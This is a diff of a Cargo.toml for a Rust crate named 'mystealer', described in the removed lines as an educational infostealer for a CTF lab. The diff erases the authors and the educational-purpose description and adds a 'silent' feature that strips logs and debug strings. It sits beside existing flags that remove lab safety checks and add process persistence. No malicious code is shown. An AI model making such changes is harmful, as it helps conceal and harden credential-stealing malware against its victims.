@@ -2,8 +2,8 @@
 name = "mystealer"
 version = "0.2.0"
 edition = "2021"
-authors = ["CTF Lab"]
-description = "Educational infostealer for CTF lab - EDUCATIONAL PURPOSES ONLY"
+authors = [""]
+description = ""
 readme = "README.md"
 license = "MIT"
 
@@ -13,6 +13,7 @@ lab-mode = []       # Ativa verificações de segurança obrigatórias
 release = []        # Remove verificações (NUNCA usar fora do lab)
 hydra = []          # Ativa sistema de redundância de processos
 hydra-auto = []     # Ativa Hydra automaticamente (sem precisar de --hydra)
+silent = []         # Remove todos os logs e strings de debug
 
 [dependencies]
 # Async runtime
